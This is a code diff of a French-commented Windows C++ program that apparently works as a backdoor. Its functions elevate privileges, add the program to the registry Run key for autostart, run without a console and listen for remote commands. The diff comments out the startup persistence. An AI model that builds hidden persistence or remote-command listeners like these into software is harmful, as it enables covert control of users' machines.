@@ -42,6 +42,7 @@ void RequestAdminPrivileges() {
 }
 
 // Ajoute le programme au démarrage en écrivant dans le registre.
+/*
 void AddToStartup() {
     HKEY hKey;
     // Ouvre la clé de registre Run de l'utilisateur courant.
@@ -59,6 +60,7 @@ void AddToStartup() {
         RegCloseKey(hKey);
     }
 }
+*/
 
 // Affiche une boîte de dialogue d'alerte.
 void ShowMessage() {
@@ -104,7 +106,9 @@ void ListenForCommand() {
 // Point d'entrée de l'application Windows (aucune console ne sera affichée)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Ajoute l'exécutable au démarrage.
+    /*
     AddToStartup();
+    */
 
     // Lance le thread qui écoute les commandes distantes.
     thread listener(ListenForCommand);
